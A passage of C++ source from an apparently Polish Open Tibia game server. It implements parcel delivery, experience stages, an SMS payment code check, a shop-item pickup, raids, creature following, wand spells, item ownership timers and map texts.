		strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M", &now);
#else
		strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M", localtime(&ticks));
#endif //USING_VISUAL_2005
    std::string bannerName = player->getName();
    std::string bannedName = bannedPlayer->getName();
	xmlDocPtr doc;
	xmlMutexLock(xmlmutex);
	xmlNodePtr root, banNode;

	doc = xmlNewDoc((const xmlChar*)"1.0");
	doc->children = xmlNewDocNode(doc, NULL, (const xmlChar*)"bans", NULL);
    root = doc->children;

    banNode = xmlNewNode(NULL,(const xmlChar*)"ban");
    xmlSetProp(banNode, (const xmlChar*) "czas", (const xmlChar*)buf);
    xmlSetProp(banNode, (const xmlChar*) "banujacy", (const xmlChar*)bannerName.c_str());
    xmlSetProp(banNode, (const xmlChar*) "zbanowany", (const xmlChar*)bannedName.c_str());
    xmlSetProp(banNode, (const xmlChar*) "powod", (const xmlChar*)reason.c_str());
    xmlSetProp(banNode, (const xmlChar*) "akcja", (const xmlChar*)action.c_str());
    xmlSetProp(banNode, (const xmlChar*) "dlugosc", (const xmlChar*)comment.c_str());
    if(IPBan != 0)
    xmlSetProp(banNode, (const xmlChar*) "ip_ban", (const xmlChar*)"true");
    else
    xmlSetProp(banNode, (const xmlChar*) "ip_ban", (const xmlChar*)"false");
    xmlAddChild(root, banNode);

    if(xmlSaveFile(filename.c_str(), doc))
	{
#ifdef __DEBUG__
		std::cout << "\tSaved the bans!" << std::endl;
#endif
		xmlFreeDoc(doc);
		xmlMutexUnlock(xmlmutex);
	}
	else
	{
		std::cout << "Couldn't save bans!" << std::endl;
		xmlFreeDoc(doc);
		xmlMutexUnlock(xmlmutex);
	}
}*/

int32_t Game::checkHouseOwners(uint32_t days)
{
    return Houses::cleanHouse(this, days);
}

#ifdef HUCZU_PARCEL_SYSTEM
bool Game::sendParcel(Player* player, Item* parcel, Position pos)
{
    bool canSend = true;
    bool foundLabel = false;
    std::string receiver;
    uint32_t depotid = 0;
    uint32_t guid = 0;
    Container* parcelbox = dynamic_cast<Container*>(parcel);

    if(parcelbox && parcel->getID() == ITEM_PARCEL)
    {
        for(int32_t x = 0; x < parcelbox->size(); x++)
        {
            Item* label = dynamic_cast<Item*>(parcelbox->getItem(x));
            if(label && label->getID() == ITEM_LABEL)
            {
                foundLabel = true;
                std::string text = label->getText();
                std::istringstream iss(text, std::istringstream::in);
                int32_t i = 0;
                std::string line[2];
                while(std::getline(iss, text,'\n'))
                {
                    line[i] = text;
                    i++;
                    if(i == 2)
                        break;
                }
                receiver = line[0];
                toLowerCaseString(line[1]);
                for(Town::TownMap::iterator sit = Town::town.begin(); sit != Town::town.end(); ++sit)
                {
                    if(sit->second.name == line[1])
                    {
                        depotid = sit->first;
                        canSend = true;
                        break;
                    }
                    else
                        canSend = false;
                }
                if(!IOPlayerSQL::getInstance()->getGuidByName(guid, receiver) || (canSend && depotid == 0))
                    canSend = false;

                if(canSend)
                    break;
            }
        }
    }
    else if(parcel->getID() == ITEM_LETTER)
    {
        foundLabel = true;
        std::string text = parcel->getText();
        std::istringstream iss(text, std::istringstream::in);
        int32_t i = 0;
        std::string line[2];
        while(std::getline(iss, text,'\n'))
        {
            line[i] = text;
            i++;
            if(i == 2)
                break;
        }
        receiver = line[0];
        toLowerCaseString(line[1]);
        for(Town::TownMap::iterator sit = Town::town.begin(); sit != Town::town.end(); ++sit)
        {
            if(sit->second.name == line[1])
            {
                depotid = sit->first;
                canSend = true;
                break;
            }
            else
                canSend = false;
        }
        if(!IOPlayerSQL::getInstance()->getGuidByName(guid, receiver) || (canSend && depotid == 0))
            canSend = false;
    }
    if(canSend && foundLabel)
    {
        Player* odbierajacy = getPlayerByName(receiver);
        if(odbierajacy)
        {
            parcel->setID((parcel->getID() == ITEM_LETTER? ITEM_STLETTER : ITEM_STPARCEL));
            Container* depot = odbierajacy->getDepot(depotid);
            if(depot && depot->addItem(parcel))
                removeThing(player, pos, parcel, true);
            else
            {
                player->sendTextMessage(MSG_INFO, "Adresat nie ma miejsca w depo.");
                parcel->setID((parcel->getID() == ITEM_STLETTER? ITEM_LETTER : ITEM_PARCEL));
                return false;
            }

            std::vector<unsigned char> containerlist;
            containerLayout::const_iterator cit;
            for(cit = odbierajacy->getContainers(); cit != odbierajacy->getEndContainer(); ++cit)
            {
                Container* c = cit->second;
                if(c == depot)
                {
                    odbierajacy->sendTextMessage(MSG_ADVANCE, "Dostales nowa wiadomosc.");
                    odbierajacy->onItemAddContainer(depot, parcel);
                    break;
                }
                if(c->getParent() == depot)
                {
                    odbierajacy->sendTextMessage(MSG_ADVANCE, "Dostales nowa wiadomosc.");
                    break;
                }
            }
        }
        else
        {
            parcel->setID((parcel->getID() == ITEM_LETTER? ITEM_STLETTER : ITEM_STPARCEL));
            odbierajacy = new Player(receiver, NULL);
            IOPlayerSQL::getInstance()->loadPlayer(odbierajacy, receiver);
            Container* depot = odbierajacy->getDepot(depotid);
            if(depot && depot->addItem(parcel))
                removeThing(player, pos, parcel, true);
            else
            {
                player->sendTextMessage(MSG_INFO, "Adresat nie ma miejsca w depo.");
                parcel->setID((parcel->getID() == ITEM_STLETTER? ITEM_LETTER : ITEM_PARCEL));
            }

            odbierajacy->lastlogin = odbierajacy->lastLoginSaved;
            IOPlayerSQL::getInstance()->savePlayer(odbierajacy);
            delete odbierajacy;
        }
    }
    return canSend;
}
#endif

#ifdef HUCZU_STAGE_EXP
uint32_t Game::getStageExp(int32_t level, bool enfo)
{
    if(!enfo)
    {
        if(lastStageLevel && level >= lastStageLevel)
            return stages[lastStageLevel];

        return stages[level];
    }
    else
    {
        if(lastStageLevelEnfo && level >= lastStageLevelEnfo)
            return stages_enfo[lastStageLevelEnfo];

        return stages_enfo[level];
    }

    return 1;
}

bool Game::loadStageExp()
{
    int32_t intValue = 0, maxPoziom = 0, minimalnyPoziom = 0, minimalnyPoziomEnfo = 0, maxPoziomEnfo = 0;
    uint32_t stage = 0, stageEnfo = 0;
    std::string file = g_config.DATA_DIR + "stages.xml";
    xmlDocPtr doc;

    doc = xmlParseFile(file.c_str());
    if (!doc)
        return false;

    xmlNodePtr root, stageNode;
    root = xmlDocGetRootElement(doc);

    if (xmlStrcmp(root->name, (const xmlChar*)"experience_stages"))
    {
        xmlFreeDoc(doc);
        return false;
    }

    stageNode = root->children;
    while (stageNode)
    {
        if (strcmp((char*) stageNode->name, "stage") == 0)
        {
            if(readXMLInteger(stageNode, "minlvl", intValue))
                minimalnyPoziom = intValue;
            if(readXMLInteger(stageNode, "maxlvl", intValue))
                maxPoziom = intValue;
            if(readXMLInteger(stageNode, "exp", intValue))
                stage = intValue;
            if(maxPoziom == 0)
            {
                lastStageLevel = minimalnyPoziom;
                stages[lastStageLevel] = stage;
            }
            else
            {
                for(int32_t i = minimalnyPoziom; i <= maxPoziom; i++)
                    stages[i] = stage;
            }
        }
        if (strcmp((char*) stageNode->name, "stage_enfo") == 0)
        {
            if(readXMLInteger(stageNode, "minlvl", intValue))
                minimalnyPoziomEnfo = intValue;
            if(readXMLInteger(stageNode, "maxlvl", intValue))
                maxPoziomEnfo = intValue;
            if(readXMLInteger(stageNode, "exp", intValue))
                stageEnfo = intValue;
            if(maxPoziomEnfo == 0)
            {
                lastStageLevelEnfo = minimalnyPoziomEnfo;
                stages_enfo[minimalnyPoziomEnfo] = stageEnfo;
            }
            else
            {
                for(int32_t i = minimalnyPoziomEnfo; i <= maxPoziomEnfo; i++)
                    stages_enfo[i] = stageEnfo;
            }
        }
        stageNode = stageNode->next;
    }
    xmlFreeDoc(doc);
    return true;
}
#endif
#ifdef HUCZU_PAY_SYSTEM
bool Game::checkHomepay(Player* player, std::string kod, std::string usluga)
{
    stringstream informacja;
    std::string get = "http://homepay.pl/sms/check_code.php?usr_id=";
    get += g_config.HOMEPAY_USR_ID;
    get +="&acc_id=";
    get += usluga;
    get += "&code=";
    get += kod;
    /*std::string post = http://homepay.pl/sms/check_code_post.php?usr_id=
    post += g_config.HOMEPAY_USR_ID;
    post += "&acc_id=";
    post += usluga;
    post += "&code=";
    post += kod;*/

    try
    {
        curlpp::Cleanup cleaner;
        curlpp::Easy request;

        request.setOpt(new curlpp::options::WriteStream(&informacja));
        request.setOpt(new curlpp::options::Url(get.c_str())); // w przypadku metody GET
        /*request.setOpt(new curlpp::options::Url(post.c_str()));
        request.setOpt(new curlpp::options::PostFields(post.c_str()));
        request.setOpt(new curlpp::options::PostFieldSize((int32_t)strlen(post.c_str())));*/ // to w przypadku metody POST
        request.perform();
    }
    catch ( curlpp::LogicError & e )
    {
        std::cout << "Blad u gracza: " << player->getName() << " wynik: "<< e.what() << std::endl;
        return false;
    }
    catch ( curlpp::RuntimeError & e )
    {
        std::cout << "Blad u gracza: " << player->getName() << " wynik: "<< e.what() << std::endl;
        return false;
    }
    int32_t wynik = atoi(informacja.str().c_str());
    if(wynik == 1)
        return true;

    return false;
}

void Game::logPunktow(Player* player, std::string kod, std::string usluga)
{
    if(!player)
        return;

    time_t rawtime;
    time (&rawtime);
    std::string czas = ctime(&rawtime);
    Database* db = Database::getInstance();
    DBQuery query;
    query << "INSERT INTO `homepay_log` (player_name, kod, usluga, czas) VALUES (" << db->escapeString(player->getName()) << "," << db->escapeString(kod) << "," << db->escapeString(usluga) << "," << db->escapeString(czas) << ")";
    if(!db->executeQuery(query.str()))
        cout << "Blad z umieszczeniem do bazy logu!" << player->getName() << endl;
}
#endif

#ifdef RAID
bool Game::loadRaid(std::string name)
{
    xmlDocPtr doc;
    std::cout << "Wykonywanie raidu: " << name << "." << std::endl;
    std::string file = "data/world/raids.xml";
    doc = xmlParseFile(file.c_str());
    if(doc)
    {
        xmlNodePtr root, raid, command;
        root = xmlDocGetRootElement(doc);
        if(xmlStrcmp(root->name, (const xmlChar*)"raids"))
        {
            xmlFreeDoc(doc);
            return -1;
        }
        raid = root->children;
        while(raid)
        {
            if(strcmp((char*) raid->name, "raid")==0)
            {

                std::string nameIN = (const char*)xmlGetProp(raid, (const xmlChar *) "name");
                if(nameIN == name)
                {
                    std::string messageIN = (const char*)xmlGetProp(raid, (const xmlChar *) "message");
                    std::string brodcasterIN = (const char*)xmlGetProp(raid, (const xmlChar *) "brodcaster");

                    Creature *c = getCreatureByName(brodcasterIN);
                    if(c)
                    {
                        creatureBroadcastMessage(c,messageIN);
                    }
                    else
                    {
                        std::cout << "Could not send news msg! Brodcaster does not exist" << std::endl;
                    }

                    if(nameIN == name)
                    {
                        command = raid->children;

                        while(command)
                        {

                            if(strcmp((char*) command->name, "monster")==0)
                            {
                                std::string monstername = (const char*)xmlGetProp(command, (const xmlChar *) "name");
                                int32_t x = atoi((const char*)xmlGetProp(command, (const xmlChar *) "x"));
                                int32_t y = atoi((const char*)xmlGetProp(command, (const xmlChar *) "y"));
                                int32_t z = atoi((const char*)xmlGetProp(command, (const xmlChar *) "z"));
                                placeRaidMonster(monstername, x, y, z);
                            }

                            if(strcmp((char*) command->name, "area")==0)
                            {
                                std::string monstername = (const char*)xmlGetProp(command, (const xmlChar *) "monster");
                                int32_t count = atoi((const char*)xmlGetProp(command, (const xmlChar *) "count"));
                                int32_t xf = atoi((const char*)xmlGetProp(command, (const xmlChar *) "posxfrom"));
                                int32_t yf = atoi((const char*)xmlGetProp(command, (const xmlChar *) "posyfrom"));
                                int32_t zf = atoi((const char*)xmlGetProp(command, (const xmlChar *) "poszfrom"));

                                int32_t xt = atoi((const char*)xmlGetProp(command, (const xmlChar *) "posxto"));
                                int32_t yt = atoi((const char*)xmlGetProp(command, (const xmlChar *) "posyto"));
                                int32_t zt = atoi((const char*)xmlGetProp(command, (const xmlChar *) "poszto"));

                                int32_t i = 0;
                                int32_t tries = 0;
                                while (i<=count && tries<=(count*10))
                                {
                                    int32_t x = (int32_t)((xt-xf) * (rand()/(RAND_MAX+1.0)) + xf);
                                    int32_t y = (int32_t)((yt-yf) * (rand()/(RAND_MAX+1.0)) + yf);
                                    int32_t z = (int32_t)((zt-zf) * (rand()/(RAND_MAX+1.0)) + zf);
                                    Tile* t = map->getTile(x,y,z);
                                    if(t && t->isPz() == false)
                                    {
                                        placeRaidMonster(monstername, x, y, z);
                                        i++;
                                    }
                                    tries++;
                                }
                            }
                            if(strcmp((char*) command->name, "message")==0)
                            {
                                std::string msg = (const char*)xmlGetProp(command, (const xmlChar *) "text");
                                std::string brodcaster = (const char*)xmlGetProp(command, (const xmlChar *) "brodcaster");
                                Creature *c = getCreatureByName(brodcaster);
                                if(c)
                                {
                                    creatureBroadcastMessage(c,msg);
                                }
                                else
                                {
                                    std::cout << "Could not send news msg! Brodcaster does not exist." << std::endl;
                                }
                            }
                            command = command->next;
                        }
                    }
                }
            }
            raid = raid->next;
        }
        xmlFreeDoc(doc);
        return 0;
    }
    return -1;
}

bool Game::placeRaidMonster(std::string name, int32_t x, int32_t y, int32_t z)
{
    Monster* monster = Monster::createMonster(name, this);
    if(!monster)
        return false;

    Position pos;
    pos.x = x;
    pos.y = y;
    pos.z = z;

    // Place the monster
    if(!placeCreature(pos, monster))
    {
        delete monster;
        return false;
    }
    else
    {
        bool canReach;
        Creature *target = monster->findTarget(0, canReach, c);
        if(target)
            monster->selectTarget(target, canReach);
    }

    return true;
}

#endif
#ifdef HUCZU_RECORD
void Game::checkRecord()
{
    if(record < getPlayersOnline())
    {
        record = getPlayersOnline();
        Database* db = Database::getInstance();
        DBQuery query;
        query << "UPDATE `server` SET `record` = " << record << ", " << "`record_date` = " << time(0);
        if(db->executeQuery(query.str()))
        {
            std::stringstream info;
            info << "Nowy rekord graczy! Jest nas: " << record;
            for(AutoList<Player>::listiterator it = Player::listPlayer.list.begin(); it != Player::listPlayer.list.end(); ++it)
            {
                if(dynamic_cast<Player*>(it->second))
                    (*it).second->sendTextMessage(MSG_ADVANCE, info.str().c_str());
            }
        }
    }
}
#endif
#ifdef HUCZU_FOLLOW
void Game::checkCreatureFollow(uint32_t id)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::checkCreatureFollow");
    Player *player = getPlayerByID(id);
    if(!player)
        return;
    if(!player->pathList.empty())
    {
        Creature *followCreature = getCreatureByID(player->followCreature);
        if(followCreature && abs(followCreature->pos.x - player->pos.x) <= 1 && abs(followCreature->pos.y - player->pos.y) <= 1)
            player->pathList.clear();
        else
        {
            Position toPos = player->pathList.front();
            player->pathList.pop_front();
            player->lastmove = OTSYS_TIME();
            this->thingMove(player, player, toPos.x, toPos.y, player->pos.z, 1);
            flushSendBuffers();
        }
        int64_t delay = player->getSleepTicks();
        stopEvent(player->eventCheckFollow);
        player->eventCheckFollow = addEvent(makeTask(delay, std::bind2nd(std::mem_fun(&Game::checkCreatureFollow), id)));
    }
    else
        player->eventCheckFollow = 0;

}
void Game::playerFollow(Player* player, Creature *followCreature)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerFollow()");
    if(followCreature->isRemoved || player->isRemoved || !player || !followCreature)
    {
        stopEvent(player->eventCheckFollow);
        player->eventCheckFollow = 0;
        player->followCreature = 0;
        return;
    }
    player->pathList = getPathToEx(player, player->pos, followCreature->pos, false);
    int64_t delay = player->getSleepTicks();
    player->eventCheckFollow = addEvent(makeTask(delay, std::bind2nd(std::mem_fun(&Game::checkCreatureFollow), player->getID())));
}
void Game::playerSetFollowCreature(Player* player, uint32_t creatureid)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::playerSetFollowCreature()");
    if(player->isRemoved || !player)
        return;
    if(creatureid == 0)
    {
        if(player->followCreature != 0 && player->attackedCreature == 0)
            player->sendCancelAttacking();
        stopEvent(player->eventCheckFollow);
        player->eventCheckFollow = 0;
        player->followCreature = 0;
        return;
    }
    else
    {
        Creature* followCreature = getCreatureByID(creatureid);
        if(followCreature)
        {
            player->followCreature = creatureid;
            stopEvent(player->eventCheckFollow);
            playerFollow(player, followCreature);
        }
    }
}
#endif //HUCZU_FOLLOW

void Game::goldBolt(Creature* c, const Position& pos)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::goldbolt()");
    std::vector<unsigned char> col;
    MagicEffectAreaNoExhaustionClass runeAreaSpell;

    runeAreaSpell.attackType = ATTACK_PHYSICAL;
    runeAreaSpell.animationEffect = NM_ANI_ENERGY;
    runeAreaSpell.hitEffect = NM_ME_ENERGY_AREA;
    runeAreaSpell.areaEffect = NM_ME_ENERGY_DAMAGE;
    runeAreaSpell.animationColor = 198; //DAMAGE_FIRE;
    runeAreaSpell.drawblood = true;
    runeAreaSpell.offensive = true;

    /* Area of Spell */
    col.push_back(1);
    col.push_back(1);
    col.push_back(1);
    runeAreaSpell.areaVec.push_back(col);
    col.clear();
    col.push_back(1);
    col.push_back(1);
    col.push_back(1);
    runeAreaSpell.areaVec.push_back(col);
    col.clear();
    col.push_back(1);
    col.push_back(1);
    col.push_back(1);
    runeAreaSpell.areaVec.push_back(col);

    /* hard no ? */
    runeAreaSpell.direction = 1;
    runeAreaSpell.minDamage = (int)(((c->level*g_config.GOLD_DMG_LVL)+(c->maglevel*g_config.GOLD_DMG_MLVL))*g_config.GOLD_DMG_LO);
    runeAreaSpell.maxDamage = (int)(((c->level*g_config.GOLD_DMG_LVL)+(c->maglevel*g_config.GOLD_DMG_MLVL))*g_config.GOLD_DMG_HI);
    creatureThrowRune(c, pos, runeAreaSpell);
}

void Game::silverWand(Creature* c, const Position& pos)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::silverwand()");
    std::vector<unsigned char> col;
    MagicEffectAreaNoExhaustionClass runeAreaSpell;

    runeAreaSpell.attackType = ATTACK_PHYSICAL;
    runeAreaSpell.animationEffect = NM_ANI_SUDDENDEATH;
    runeAreaSpell.hitEffect = NM_ME_MORT_AREA;
    runeAreaSpell.areaEffect = NM_ME_MORT_AREA;
    runeAreaSpell.animationColor = 64; //DAMAGE_FIRE;
    runeAreaSpell.drawblood = true;
    runeAreaSpell.offensive = true;

    /* Area of Spell */
    col.push_back(0);
    col.push_back(0);
    col.push_back(0);
    runeAreaSpell.areaVec.push_back(col);
    col.clear();
    col.push_back(0);
    col.push_back(1);
    col.push_back(0);
    runeAreaSpell.areaVec.push_back(col);
    col.clear();
    col.push_back(0);
    col.push_back(0);
    col.push_back(0);
    runeAreaSpell.areaVec.push_back(col);

    /* hard no ? */
    runeAreaSpell.direction = 1;
    runeAreaSpell.minDamage = (int)(((c->level*g_config.SILVER_DMG_LVL)+(c->maglevel*g_config.SILVER_DMG_MLVL))*g_config.SILVER_DMG_LO);
    runeAreaSpell.maxDamage = (int)(((c->level*g_config.SILVER_DMG_LVL)+(c->maglevel*g_config.SILVER_DMG_MLVL))*g_config.SILVER_DMG_HI);
    creatureThrowRune(c, pos, runeAreaSpell);
}

void Game::startOwner(Item* item, Player* player)
{
    if(item->getOwner() != "")
        return;
    item->setOwner(player->getName());
    //item->setOwnerTime(30);
    item->setOwnerTime(g_config.OWNER_TIME);
    uint32_t otime = g_config.OWNER_TIME;
    if(otime == 0)
        return;
    if(otime < g_config.OWNER_TIME)
        otime = g_config.OWNER_TIME;
    //otime = (otime/30)+30;
    item->useThing();
    list<ownerBlock*>::iterator it;
    for(it = ownerVector.begin(); it != ownerVector.end(); it++)
    {
        if((*it)->ownerTime == otime)
        {
            (*it)->ownerItems.push_back(item);
            return;
        }
    }
    ownerBlock* db = new ownerBlock;
    db->ownerTime = otime;
    db->ownerItems.clear();
    db->ownerItems.push_back(item);
    ownerVector.push_back(db);
}

int32_t Game::checkOwner()
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::checkOwner()");

    list<ownerBlock*>::iterator it;
    for(it = ownerVector.begin(); it != ownerVector.end();)
    {
        (*it)->ownerTime -= 1;

        list<Item*>::iterator it5;
        for(it5 = (*it)->ownerItems.begin(); it5 != (*it)->ownerItems.end(); it5++)
        {
            Item* item = *it5;
            int32_t sot = item->getOwnerTime()-1;
            item->setOwnerTime(sot);
        }
        if((*it)->ownerTime <= 0)
        {
            list<Item*>::iterator it2;
            for(it2 = (*it)->ownerItems.begin(); it2 != (*it)->ownerItems.end(); it2++)
            {
                Item* item = *it2;
                item->setOwner("");
            }
            delete *it;
            it = ownerVector.erase(it);
        }
        else
        {
            it++;
        }
    }
    addEvent(makeTask(1000, std::mem_fun(&Game::checkOwner)));
}

bool Game::loadNpcs()
{
    xmlDocPtr doc;
    doc = xmlParseFile((g_config.DATA_DIR + "world/npc.xml").c_str());
    if (!doc)
        return false;

    xmlNodePtr root, npcNode;
    root = xmlDocGetRootElement(doc);

    if (xmlStrcmp(root->name, (const xmlChar*)"npclist"))
    {
        xmlFreeDoc(doc);
        return false;
    }

    npcNode = root->children;
    while (npcNode)
    {
        if (strcmp((const char*) npcNode->name, "npc") == 0)
        {
            std::string name = (const char*)xmlGetProp(npcNode, (const xmlChar *) "name");
            int x = atoi((const char*) xmlGetProp(npcNode, (const xmlChar*) "x"));
            int y = atoi((const char*) xmlGetProp(npcNode, (const xmlChar*) "y"));
            int z = atoi((const char*) xmlGetProp(npcNode, (const xmlChar*) "z"));

            Npc* mynpc = new Npc(name, this);

            if (mynpc->isLoaded())
            {
                mynpc->pos = Position(x, y, z);

                if (!placeCreature(mynpc->pos, mynpc))
                {
                    std::cout << "Could not place " << name << "!" << std::endl;
                    xmlFreeDoc(doc);
                    return false;
                }

                const char* tmp = (const char*)xmlGetProp(npcNode, (const xmlChar*) "dir");
                if (tmp)
                    mynpc->setDirection((Direction)atoi(tmp));
            }
        }
        npcNode = npcNode->next;
    }

    xmlFreeDoc(doc);
    return true;
}
void Game::checkShopItems(Player* player)
{
    if(!player)
        return;

    Database* db = Database::getInstance();
    DBQuery query;
    DBResult* result;
    std::stringstream informacja;
    query << "SELECT * FROM `z_ots_comunication` WHERE `name` " << db->getStringComparison() << db->escapeString(player->getName());
    if(!(result = db->storeQuery(query.str())))
        return;
    do
    {
        if(result->getDataString("action") == "give_item")
        {
            uint32_t id = result->getDataInt("id");
            uint16_t itemid = atoi(result->getDataString("param1").c_str());
            uint8_t count = atoi(result->getDataString("param2").c_str());
            std::string itemname = result->getDataString("param6");
            Item* item = Item::CreateItem(itemid,count);
            if(player->addItem(item))
            {
                informacja << "Otrzymales " << itemname << " z sms shopu.";
                query.str("");
                query << "DELETE FROM `z_ots_comunication` WHERE `id` = " << id;
                db->executeQuery(query.str());
                player->sendTextMessage(MSG_EVENT, informacja.str().c_str());
                informacja.str("");
            }
            else
            {
                informacja << "Nie moge dodac przedmiotu z sms shopu! Zrob miejsce i relognij.";
                player->sendTextMessage(MSG_EVENT, informacja.str().c_str());
                informacja.str("");
            }

        }
    }
    while(result->next());

    result->free();
}
#ifdef HUCZU_NAPISY
bool Game::loadNapisy()
{
    xmlDocPtr doc;
    std::string file = "data/napisy.xml";
    doc = xmlParseFile(file.c_str());
    Position pos;
    if(doc)
    {
        xmlNodePtr root, napis;
        root = xmlDocGetRootElement(doc);
        if(xmlStrcmp(root->name, (const xmlChar*)"napisy"))
        {
            xmlFreeDoc(doc);
            return false;
        }
        napis = root->children;
        while(napis)
        {
            if(strcmp((char*) napis->name, "napis") == 0)
            {
                uint32_t id = atoi((const char*)xmlGetProp(napis, (const xmlChar *) "id"));
                std::string tekst = (const char*)xmlGetProp(napis, (const xmlChar *) "text");
                pos.x = atoi((const char*)xmlGetProp(napis, (const xmlChar *) "x"));
                pos.y = atoi((const char*)xmlGetProp(napis, (const xmlChar *) "y"));
                pos.z = atoi((const char*)xmlGetProp(napis, (const xmlChar *) "z"));
                uint16_t kolor = atoi((const char*)xmlGetProp(napis, (const xmlChar *) "kolor"));
                napisy[id].text = tekst;
                napisy[id].pos = pos;
                napisy[id].kolor = kolor;
            }
            napis = napis->next;
        }
        xmlFreeDoc(doc);
        return true;
    }
    return false;
}

void Game::checkNapisy()
{
    addEvent(makeTask(3000, std::mem_fun(&Game::checkNapisy)));
    for(NapisyMap::iterator sit = napisy.begin(); sit != napisy.end(); ++sit)
    {
        Position position = sit->second.pos;
        SpectatorVec list;
        getSpectators(Range(position, true), list);
        for(SpectatorVec::iterator it = list.begin(); it != list.end(); ++it)
        {
            Player *p = dynamic_cast<Player*>(*it);
            if(p)
                p->sendAnimatedText(position, sit->second.kolor, sit->second.text);
        }
    }
}
#endif
